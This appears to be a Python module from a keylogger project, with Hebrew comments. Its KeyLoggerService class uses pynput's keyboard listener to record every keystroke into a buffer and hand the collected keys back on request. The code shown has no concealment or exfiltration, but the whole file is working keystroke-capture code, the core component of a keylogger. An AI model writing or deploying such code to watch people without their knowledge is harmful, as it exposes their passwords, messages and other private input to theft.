from pynput import keyboard
from Ikeyloger import IKeyLogger
class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.buffer: list[str] = []
        self._listener = None


    def on_press(self,key):
      try:
        self.buffer.append(key.char)  # מקש רגיל
      except AttributeError:
        self.buffer.append(str(key))  # מקש מיוחד (למשל Enter, Shift)

    def start_logging(self) -> None:
            # יצירת מאזין
        self._listener = keyboard.Listener(on_press=self.on_press)
        self._listener.start()

    def stop_logging(self) -> None:
        if self._listener:
                self._listener.stop()

    def get_logged_keys(self) -> list[str]:
        temp=self.buffer
        self.buffer= []
        return  temp
